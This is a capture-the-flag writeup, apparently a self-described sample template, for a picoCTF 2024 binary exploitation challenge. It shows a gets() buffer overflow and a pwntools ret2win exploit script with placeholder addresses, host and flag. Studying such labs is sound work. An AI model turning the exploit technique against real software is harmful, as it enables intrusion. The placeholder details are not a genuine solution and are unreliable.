---
title: "picoCTF 2024 - Binary Exploitation Challenge"
date: 2025-12-25
author: "k1nt4r0u"
tags: ["CTF", "reverse-engineering", "binary-exploitation", "picoCTF"]
categories: ["writeups"]
contest: "picoCTF 2024"
description: "Writeup for a binary exploitation challenge from picoCTF 2024"
---

## Challenge Information

- **Name:** Sample Binary Challenge
- **Category:** Binary Exploitation
- **Points:** 300
- **Difficulty:** Medium

## Description

This is a sample writeup template for CTF challenges. The challenge involved exploiting a buffer overflow vulnerability in a binary.

## Initial Analysis

First, I checked the binary with `file` and `checksec`:

```bash
$ file challenge
challenge: ELF 64-bit LSB executable, x86-64

$ checksec challenge
[*] '/path/to/challenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Vulnerability Discovery

After analyzing the binary with Ghidra, I found a vulnerable function:

```c
void vulnerable_function() {
    char buffer[64];
    gets(buffer);  // Vulnerable!
    printf("You entered: %s\n", buffer);
}
```

The `gets()` function doesn't perform bounds checking, allowing for a buffer overflow.

## Exploitation

### Step 1: Finding the Offset

Using `pattern_create` from pwntools:

```python
from pwn import *

offset = cyclic_find(0x61616171)  # Found offset: 72
```

### Step 2: Crafting the Payload

```python
#!/usr/bin/env python3
from pwn import *

# Setup
elf = ELF('./challenge')
p = remote('challenge.server.com', 1337)

# Addresses
win_function = p64(0x401234)

# Craft payload
payload = b'A' * 72
payload += win_function

# Send and get flag
p.sendline(payload)
p.interactive()
```

### Step 3: Getting the Flag

```bash
$ python3 exploit.py
[+] Opening connection to challenge.server.com on port 1337
[*] Switching to interactive mode
picoCTF{s4mpl3_fl4g_h3r3_123}
```

## Flag

```
picoCTF{s4mpl3_fl4g_h3r3_123}
```

## Lessons Learned

- Always check for unsafe functions like `gets()`, `strcpy()`, etc.
- Use tools like Ghidra or IDA for static analysis
- `checksec` is essential for understanding binary protections
- Practice with pwntools for exploit development

## Tools Used

- Ghidra
- pwntools
- gdb-peda
- checksec

---

**Author:** k1nt4r0u (Sky1nNorth)  
**Date:** December 25, 2025
